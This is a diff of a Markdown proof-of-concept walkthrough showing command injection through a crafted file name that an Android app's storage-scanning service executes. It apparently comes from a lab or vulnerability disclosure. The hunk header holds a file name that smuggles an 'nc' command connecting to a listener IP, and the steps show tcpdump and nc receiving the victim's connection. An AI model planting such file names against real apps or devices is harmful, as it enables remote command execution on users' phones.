@@ -20,24 +20,29 @@ touch "zzz & nc 192.168.188.200 8002"
 
 3. Setup listener.
 - tcpdump
-![tcpdump setup](images/setup%20tcpdump.png)
-- nc
-![nc setup](images/setup%20nc%20listener.png)
 
-3. IP information for hosts and android (victim)
+   ![tcpdump setup](images/setup%20tcpdump.png)
+- nc
+
+   ![nc setup](images/setup%20nc%20listener.png)
+
+4. IP information for hosts and android (victim)
 - Hosts:
 ![hosts ip](images/ifconfig%20hosts.png)
 - Android (Victim):
 ![victim ip](images/android%20devices%20ip.png)
 
-3. Toggle the button to run the service
-![Enabling services](images/toggle%20enable%20scanner.png)
+5. Toggle the button to run the service
 
-4. The service is do loop through all files in external storages.
+   ![Enabling services](images/toggle%20enable%20scanner.png)
+
+6. The service is do loop through all files in external storages.
 ![malicious filename is runned](images/log%20loop%20all%20file.png)
 
-6. We got connection from the android.
+7. We got connection from the android.
 - tcpdump (received icmp packet)
-![received icmp](images/ping%20received.png)
+
+   ![received icmp](images/ping%20received.png)
 - nc (received connection)
-![received connection](images/nc%20received%20connection.png)
+
+   ![received connection](images/nc%20received%20connection.png)
